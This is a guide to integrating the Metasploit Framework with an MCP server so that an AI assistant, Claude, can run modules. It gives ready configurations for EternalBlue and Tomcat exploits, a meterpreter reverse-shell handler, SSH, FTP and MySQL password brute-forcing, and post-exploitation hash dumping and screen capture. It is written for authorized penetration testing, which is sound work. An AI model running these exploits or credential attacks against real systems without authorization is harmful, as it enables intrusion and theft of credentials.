# Metasploit Framework Integration Guide

## Overview

The Kali MCP Server includes full Metasploit Framework integration, allowing AI-assisted exploitation, scanning, and post-exploitation activities through Claude.

## Features

✅ **Exploit Modules** - Run exploits against vulnerable systems
✅ **Auxiliary Modules** - Scanners, fuzzers, and reconnaissance tools
✅ **Post Modules** - Post-exploitation activities
✅ **Payload Generation** - Automatic payload configuration
✅ **Resource Scripts** - Automated command execution
✅ **Rate Limited** - Protected with dynamic rate limiting (3-5 requests/minute)

## Basic Usage

### Function Signature

```python
metasploit_run(
    module: str,           # Metasploit module path
    options: Dict = {}     # Module options as key-value pairs
) -> str                   # Formatted report
```

### Simple Example

```python
# Scan SMB version
result = metasploit_run(
    module="auxiliary/scanner/smb/smb_version",
    options={
        "RHOSTS": "192.168.1.100"
    }
)
```

## Common Use Cases

### 1. Network Scanning

#### SMB Version Detection
```python
metasploit_run(
    module="auxiliary/scanner/smb/smb_version",
    options={
        "RHOSTS": "192.168.1.0/24",
        "THREADS": "10"
    }
)
```

#### SSH Version Scanner
```python
metasploit_run(
    module="auxiliary/scanner/ssh/ssh_version",
    options={
        "RHOSTS": "192.168.1.100",
        "RPORT": "22"
    }
)
```

#### HTTP Version Detection
```python
metasploit_run(
    module="auxiliary/scanner/http/http_version",
    options={
        "RHOSTS": "192.168.1.100",
        "RPORT": "80"
    }
)
```

### 2. Vulnerability Scanning

#### EternalBlue Scanner (MS17-010)
```python
metasploit_run(
    module="auxiliary/scanner/smb/smb_ms17_010",
    options={
        "RHOSTS": "192.168.1.100"
    }
)
```

#### Apache Struts Scanner
```python
metasploit_run(
    module="auxiliary/scanner/http/apache_struts_rce",
    options={
        "RHOSTS": "192.168.1.100",
        "TARGETURI": "/struts2-showcase"
    }
)
```

#### Shellshock Scanner
```python
metasploit_run(
    module="auxiliary/scanner/http/apache_mod_cgi_bash_env",
    options={
        "RHOSTS": "192.168.1.100",
        "TARGETURI": "/cgi-bin/test.sh"
    }
)
```

### 3. Exploitation (Ethical Testing Only!)

#### Multi Handler (Catch Reverse Shells)
```python
metasploit_run(
    module="exploit/multi/handler",
    options={
        "PAYLOAD": "windows/meterpreter/reverse_tcp",
        "LHOST": "192.168.1.50",
        "LPORT": "4444"
    }
)
```

#### EternalBlue Exploit
```python
metasploit_run(
    module="exploit/windows/smb/ms17_010_eternalblue",
    options={
        "RHOSTS": "192.168.1.100",
        "LHOST": "192.168.1.50"
    }
)
```

#### Tomcat Manager Upload
```python
metasploit_run(
    module="exploit/multi/http/tomcat_mgr_upload",
    options={
        "RHOSTS": "192.168.1.100",
        "RPORT": "8080",
        "HttpUsername": "admin",
        "HttpPassword": "admin",
        "LHOST": "192.168.1.50"
    }
)
```

### 4. Brute Force Attacks

#### SSH Login Scanner
```python
metasploit_run(
    module="auxiliary/scanner/ssh/ssh_login",
    options={
        "RHOSTS": "192.168.1.100",
        "USERNAME": "root",
        "PASS_FILE": "/usr/share/wordlists/metasploit/unix_passwords.txt",
        "THREADS": "5"
    }
)
```

#### FTP Login Scanner
```python
metasploit_run(
    module="auxiliary/scanner/ftp/ftp_login",
    options={
        "RHOSTS": "192.168.1.100",
        "USER_FILE": "/usr/share/wordlists/metasploit/unix_users.txt",
        "PASS_FILE": "/usr/share/wordlists/metasploit/unix_passwords.txt"
    }
)
```

#### MySQL Login Scanner
```python
metasploit_run(
    module="auxiliary/scanner/mysql/mysql_login",
    options={
        "RHOSTS": "192.168.1.100",
        "USERNAME": "root",
        "PASS_FILE": "/usr/share/wordlists/rockyou.txt",
        "THREADS": "10"
    }
)
```

### 5. Post-Exploitation

#### Gather System Info
```python
metasploit_run(
    module="post/windows/gather/enum_system",
    options={
        "SESSION": "1"
    }
)
```

#### Dump Hashes
```python
metasploit_run(
    module="post/windows/gather/hashdump",
    options={
        "SESSION": "1"
    }
)
```

#### Screenshot Capture
```python
metasploit_run(
    module="post/windows/gather/screen_spy",
    options={
        "SESSION": "1",
        "DELAY": "5"
    }
)
```

## Module Categories

### Auxiliary Modules
- **Scanners**: Port scanning, service detection, vulnerability scanning
- **Fuzzers**: Protocol fuzzing, input validation testing
- **Denial of Service**: DoS testing modules
- **Gather**: Information gathering and reconnaissance

### Exploit Modules
- **Windows**: Windows-specific exploits
- **Linux**: Linux-specific exploits
- **Multi**: Cross-platform exploits
- **Unix**: Unix/BSD exploits

### Post Modules
- **Windows**: Windows post-exploitation
- **Linux**: Linux post-exploitation
- **Multi**: Cross-platform post-exploitation

## Common Options

### Network Options
```python
{
    "RHOSTS": "192.168.1.100",      # Target host(s)
    "RPORT": "445",                  # Target port
    "LHOST": "192.168.1.50",         # Local host (for reverse connections)
    "LPORT": "4444"                  # Local port
}
```

### Threading Options
```python
{
    "THREADS": "10",                 # Number of concurrent threads
    "ShowProgress": "true"           # Show progress
}
```

### Authentication Options
```python
{
    "USERNAME": "admin",             # Single username
    "PASSWORD": "password",          # Single password
    "USER_FILE": "/path/to/users",   # Username wordlist
    "PASS_FILE": "/path/to/passes"   # Password wordlist
}
```

### Payload Options
```python
{
    "PAYLOAD": "windows/meterpreter/reverse_tcp",
    "LHOST": "192.168.1.50",
    "LPORT": "4444",
    "EXITFUNC": "thread"
}
```

## Best Practices

### 1. Always Test on Authorized Systems

```python
# ✅ GOOD: Testing your own lab
metasploit_run(
    module="auxiliary/scanner/smb/smb_version",
    options={"RHOSTS": "192.168.56.101"}  # Your VM
)

# ❌ BAD: Testing unauthorized systems
metasploit_run(
    module="exploit/windows/smb/ms17_010_eternalblue",
    options={"RHOSTS": "random-ip"}  # Illegal!
)
```

### 2. Use Appropriate Thread Counts

```python
# ✅ GOOD: Reasonable thread count
options = {"THREADS": "5"}

# ❌ BAD: Too many threads (may crash target or trigger IDS)
options = {"THREADS": "100"}
```

### 3. Handle Rate Limits

```python
import time

targets = ["192.168.1.100", "192.168.1.101", "192.168.1.102"]

for target in targets:
    result = metasploit_run(
        module="auxiliary/scanner/smb/smb_version",
        options={"RHOSTS": target}
    )
    
    if "RATE LIMIT REACHED" in result:
        print("Rate limited. Waiting 60 seconds...")
        time.sleep(60)
    
    # Add delay between scans
    time.sleep(20)  # 3 per minute = 20 second delay
```

### 4. Verify Module Exists

```python
# Common modules that should work
safe_modules = [
    "auxiliary/scanner/smb/smb_version",
    "auxiliary/scanner/ssh/ssh_version",
    "auxiliary/scanner/http/http_version",
    "auxiliary/scanner/portscan/tcp"
]

# Test with a known module first
result = metasploit_run(
    module="auxiliary/scanner/smb/smb_version",
    options={"RHOSTS": "192.168.1.100"}
)
```

## Troubleshooting

### Issue: "Module not found"

**Cause:** Invalid module path

**Solution:**
```bash
# On Kali VM, search for modules
msfconsole -q -x "search smb_version; exit"

# List all auxiliary scanners
msfconsole -q -x "search type:auxiliary scanner; exit"
```

### Issue: "No session created"

**Cause:** Exploit failed or target not vulnerable

**Solution:**
1. Verify target is vulnerable with scanner first
2. Check network connectivity
3. Ensure correct options (LHOST, LPORT, etc.)
4. Review Metasploit output for errors

### Issue: "Rate limit exceeded"

**Cause:** Too many requests too quickly

**Solution:**
```python
# Add delays between requests
import time
time.sleep(20)  # Wait 20 seconds between scans
```

### Issue: "Connection timeout"

**Cause:** Target unreachable or firewall blocking

**Solution:**
1. Verify target is up: `nmap -sn 192.168.1.100`
2. Check firewall rules
3. Ensure correct RPORT
4. Try different module

## Security Considerations

### Rate Limiting
- **Base Limit**: 3 requests/minute
- **Low Load**: Up to 4-5 requests/minute
- **High Load**: Down to 1-2 requests/minute

### Resource Usage
- **CPU**: High (0.8 weight)
- **Memory**: Very High (0.9 weight)
- **I/O**: Moderate (0.6 weight)

### Concurrent Scans
- Maximum 5 concurrent Metasploit operations
- Automatically queued when limit reached

## Example Workflows

### Workflow 1: SMB Enumeration

```python
# Step 1: Detect SMB version
version_result = metasploit_run(
    module="auxiliary/scanner/smb/smb_version",
    options={"RHOSTS": "192.168.1.100"}
)

# Step 2: Check for EternalBlue
vuln_result = metasploit_run(
    module="auxiliary/scanner/smb/smb_ms17_010",
    options={"RHOSTS": "192.168.1.100"}
)

# Step 3: Enumerate shares
shares_result = metasploit_run(
    module="auxiliary/scanner/smb/smb_enumshares",
    options={"RHOSTS": "192.168.1.100"}
)
```

### Workflow 2: Web Application Testing

```python
# Step 1: Detect web server
server_result = metasploit_run(
    module="auxiliary/scanner/http/http_version",
    options={"RHOSTS": "192.168.1.100"}
)

# Step 2: Directory brute force
dir_result = metasploit_run(
    module="auxiliary/scanner/http/dir_scanner",
    options={
        "RHOSTS": "192.168.1.100",
        "DICTIONARY": "/usr/share/wordlists/dirb/common.txt"
    }
)

# Step 3: Check for common vulnerabilities
vuln_result = metasploit_run(
    module="auxiliary/scanner/http/apache_struts_rce",
    options={"RHOSTS": "192.168.1.100"}
)
```

### Workflow 3: Network Service Enumeration

```python
services = [
    ("auxiliary/scanner/ssh/ssh_version", "22"),
    ("auxiliary/scanner/ftp/ftp_version", "21"),
    ("auxiliary/scanner/mysql/mysql_version", "3306"),
    ("auxiliary/scanner/smb/smb_version", "445")
]

target = "192.168.1.100"

for module, port in services:
    result = metasploit_run(
        module=module,
        options={"RHOSTS": target, "RPORT": port}
    )
    print(f"Port {port}: {result}")
    time.sleep(20)  # Rate limit compliance
```

## Legal and Ethical Guidelines

⚠️ **CRITICAL WARNINGS:**

1. **Authorization Required**: Only test systems you own or have explicit written permission to test
2. **Legal Consequences**: Unauthorized access is illegal in most jurisdictions
3. **Ethical Use**: Use for defensive security, research, and authorized penetration testing only
4. **Documentation**: Keep records of authorization and testing scope
5. **Responsible Disclosure**: Report vulnerabilities responsibly

## Summary

Metasploit integration provides:

✅ **Comprehensive Testing** - Exploit, scan, and post-exploitation modules
✅ **AI-Assisted** - Claude can help select and configure modules
✅ **Rate Protected** - Dynamic limiting prevents VM overload
✅ **Formatted Output** - Clean, readable reports
✅ **Secure Execution** - Sanitized inputs and temporary file cleanup

Use responsibly and only on authorized systems!
